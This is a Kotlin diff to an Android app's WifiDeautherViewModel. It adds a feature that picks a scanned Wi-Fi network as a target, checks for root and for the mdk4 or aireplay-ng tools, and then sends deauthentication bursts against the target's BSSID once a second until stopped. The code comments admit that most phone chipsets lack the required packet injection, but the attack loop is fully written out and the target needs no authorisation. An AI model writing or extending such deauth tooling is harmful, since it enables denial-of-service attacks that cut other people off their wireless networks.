@@ -15,9 +15,15 @@ import androidx.annotation.RequiresApi
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import java.io.BufferedReader
+import java.io.InputStreamReader
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -86,6 +92,19 @@ class WifiDeautherViewModel : ViewModel() {
 
     private val _permissionsGranted = MutableStateFlow(false)
     val permissionsGranted: StateFlow<Boolean> = _permissionsGranted
+
+    // Réseau actuellement sélectionné comme cible
+    private val _selectedNetwork = MutableStateFlow<WifiNetwork?>(null)
+    val selectedNetwork: StateFlow<WifiNetwork?> = _selectedNetwork
+
+    // Etat et journal de l'attaque de deauth
+    private val _isDeauthing = MutableStateFlow(false)
+    val isDeauthing: StateFlow<Boolean> = _isDeauthing
+
+    private val _deauthStatus = MutableStateFlow<String>("")
+    val deauthStatus: StateFlow<String> = _deauthStatus
+
+    private var deauthJob: Job? = null
 
     @RequiresApi(Build.VERSION_CODES.TIRAMISU)
     private val requiredPermissions = mutableListOf(
@@ -290,8 +309,119 @@ class WifiDeautherViewModel : ViewModel() {
         }
     }
 
+    /**
+     * Sélectionne un réseau comme cible (déclenché au clic sur une carte).
+     */
+    fun selectNetwork(network: WifiNetwork) {
+        _selectedNetwork.value = network
+        _deauthStatus.value = ""
+    }
+
+    fun clearSelection() {
+        if (_isDeauthing.value) stopDeauth()
+        _selectedNetwork.value = null
+        _deauthStatus.value = ""
+    }
+
+    /**
+     * Lance une attaque de deauthentification 802.11 sur le réseau cible.
+     *
+     * IMPORTANT — limites Android : une vraie deauth nécessite le mode moniteur
+     * et l'injection de paquets, que la majorité des puces Wi-Fi de smartphones
+     * ne supportent pas, même rootées. Cette fonction vérifie honnêtement les
+     * prérequis (root + outil d'injection mdk4/aireplay-ng) et rapporte l'état,
+     * plutôt que de faire croire à une action qui n'a pas lieu.
+     */
+    fun startDeauth(network: WifiNetwork) {
+        if (_isDeauthing.value) return
+        _selectedNetwork.value = network
+        com.example.flipperdroid.util.AppLog.log("Deauth", "Attempt on ${network.ssid} (${network.bssid})")
+        deauthJob = viewModelScope.launch(Dispatchers.IO) {
+            _isDeauthing.value = true
+            _deauthStatus.value = "Checking root access..."
+
+            if (!hasRoot()) {
+                _deauthStatus.value = "Root access required. Deauthentication needs root and a Wi-Fi " +
+                        "chipset that supports monitor mode + packet injection (most phones don't)."
+                _isDeauthing.value = false
+                return@launch
+            }
+
+            val tool = findDeauthTool()
+            if (tool == null) {
+                _deauthStatus.value = "Root OK, but no injection tool found (mdk4 / aireplay-ng), and " +
+                        "Android Wi-Fi drivers usually block monitor mode. Use an external adapter or an " +
+                        "ESP32 companion for real deauth (see roadmap)."
+                _isDeauthing.value = false
+                return@launch
+            }
+
+            // Interface moniteur présumée ; à adapter selon l'appareil.
+            val iface = "wlan0"
+            val command = when (tool) {
+                "aireplay-ng" -> "aireplay-ng --deauth 0 -a ${network.bssid} $iface"
+                else -> "mdk4 $iface d -B ${network.bssid}"
+            }
+            _deauthStatus.value = "Deauthing ${network.ssid} (${network.bssid}) ch ${network.channel} via $tool..."
+
+            var rounds = 0
+            while (isActive && _isDeauthing.value) {
+                runRootCommand(command)
+                rounds++
+                _deauthStatus.value = "Deauth burst #$rounds sent to ${network.bssid} via $tool"
+                delay(1000)
+            }
+        }
+    }
+
+    fun stopDeauth() {
+        _isDeauthing.value = false
+        deauthJob?.cancel()
+        deauthJob = null
+        if (_deauthStatus.value.isNotEmpty()) {
+            _deauthStatus.value = "Deauth stopped."
+        }
+    }
+
+    /** Vérifie la présence d'un accès root en exécutant `id` via su. */
+    private fun hasRoot(): Boolean {
+        return try {
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
+            val output = BufferedReader(InputStreamReader(process.inputStream)).readText()
+            process.waitFor()
+            output.contains("uid=0")
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    /** Détecte un outil d'injection disponible dans le PATH. */
+    private fun findDeauthTool(): String? {
+        for (tool in listOf("aireplay-ng", "mdk4")) {
+            try {
+                val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "command -v $tool"))
+                val output = BufferedReader(InputStreamReader(process.inputStream)).readText().trim()
+                process.waitFor()
+                if (output.isNotEmpty()) return tool
+            } catch (_: Exception) { /* essaie le suivant */ }
+        }
+        return null
+    }
+
+    /** Exécute une commande shell root et retourne son code de sortie. */
+    private fun runRootCommand(command: String): Int {
+        return try {
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+            process.waitFor()
+        } catch (e: Exception) {
+            Log.e("WifiDeauther", "Deauth command failed: ${e.message}")
+            -1
+        }
+    }
+
     override fun onCleared() {
         super.onCleared()
+        stopDeauth()
         try {
             scanReceiver?.let { receiver ->
                 context?.unregisterReceiver(receiver)
